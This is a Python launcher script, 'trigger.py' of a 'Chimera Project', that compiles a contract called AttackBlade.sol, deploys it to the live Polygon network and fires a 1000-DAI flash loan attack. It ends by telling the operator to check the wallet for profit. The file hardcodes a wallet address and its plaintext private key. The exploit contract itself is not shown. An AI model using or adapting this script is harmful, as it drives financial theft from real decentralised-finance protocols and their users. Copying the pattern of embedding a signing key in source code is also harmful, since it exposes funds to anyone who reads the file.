# [Homebrew 4] - Chimera Project
# Module: trigger.py
# Purpose: The hilt for the Chimera's Blade. SELF-SUFFICIENT version.
# It now verifies and installs its own dependencies and specifies encoding.

import json
import time
from web3 import Web3
from solcx import compile_source, set_solc_version, install_solc, get_installed_solc_versions

# --- CONFIGURATION ---
RPC_URL = "https://polygon-rpc.com/"
OPERATOR_WALLET = {
    "address": "0xd2bE94A469F2fDA038F1E9aB722F38D2C3251Fb7",
    "private_key": "0x6d19ba9a8853b6cd524862a75e539b2c6030877f0449a7f91926a429c25386b6"
}
LOAN_AMOUNT = 1000 * (10**18)
REQUIRED_SOLC_VERSION = 'v0.8.10'

def setup_compiler():
    """Checks if the required solc version is installed, and installs it if not."""
    print("[TRIGGER] Verifying Solidity compiler...")
    if REQUIRED_SOLC_VERSION not in get_installed_solc_versions():
        print(f"[SETUP] Required compiler {REQUIRED_SOLC_VERSION} not found. Installing...")
        install_solc(REQUIRED_SOLC_VERSION)
        print("[SETUP] Compiler installed successfully.")
    else:
        print(f"[SETUP] Compiler {REQUIRED_SOLC_VERSION} already installed.")
    set_solc_version(REQUIRED_SOLC_VERSION)

def compile_contract():
    print("[TRIGGER] Compiling AttackBlade.sol...")
    # <<< ИСПРАВЛЕНО: Явно указана кодировка UTF-8 для чтения файла.
    with open("contracts/AttackBlade.sol", "r", encoding="utf-8") as f:
        source_code = f.read()
    
    compiled_sol = compile_source(source_code, output_values=['abi', 'bin'])
    contract_interface = compiled_sol['<stdin>:AttackBlade']
    
    print("[TRIGGER] Compilation successful.")
    return contract_interface['abi'], contract_interface['bin']

def main():
    # 1. Setup Environment
    setup_compiler()

    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[FATAL] Could not connect.")
        return

    operator_address = OPERATOR_WALLET['address']
    private_key = OPERATOR_WALLET['private_key']
    
    # 2. Compile the contract
    abi, bytecode = compile_contract()

    # 3. Deploy the contract
    print("[TRIGGER] Deploying contract...")
    Contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    
    nonce = w3.eth.get_transaction_count(operator_address)
    tx_deploy = Contract.constructor().build_transaction({
        'from': operator_address,
        'nonce': nonce,
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })

    signed_tx = w3.eth.account.sign_transaction(tx_deploy, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Deployment transaction sent. Hash: {tx_hash.hex()}. Waiting for confirmation...")
    
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    contract_address = tx_receipt.contractAddress
    print(f"[SUCCESS] Contract deployed at: {contract_address}")

    # 4. Trigger the attack
    print(f"\n[TRIGGER] Triggering flash loan attack with {LOAN_AMOUNT / (10**18)} DAI...")
    attack_contract = w3.eth.contract(address=contract_address, abi=abi)
    
    nonce = w3.eth.get_transaction_count(operator_address)
    tx_attack = attack_contract.functions.startAttack(
        "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", # Address of DAI on Polygon
        LOAN_AMOUNT
    ).build_transaction({
        'from': operator_address,
        'nonce': nonce,
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_attack_tx = w3.eth.account.sign_transaction(tx_attack, private_key)
    attack_tx_hash = w3.eth.send_raw_transaction(signed_attack_tx.raw_transaction)
    print(f"Attack transaction sent. Hash: {attack_tx_hash.hex()}. Waiting for confirmation...")
    
    w3.eth.wait_for_transaction_receipt(attack_tx_hash)
    print("[SUCCESS] Attack transaction confirmed. Check your wallet for profit.")
    print("\n[CHIMERA] ATTACK CYCLE COMPLETE.")

if __name__ == '__main__':
    main()
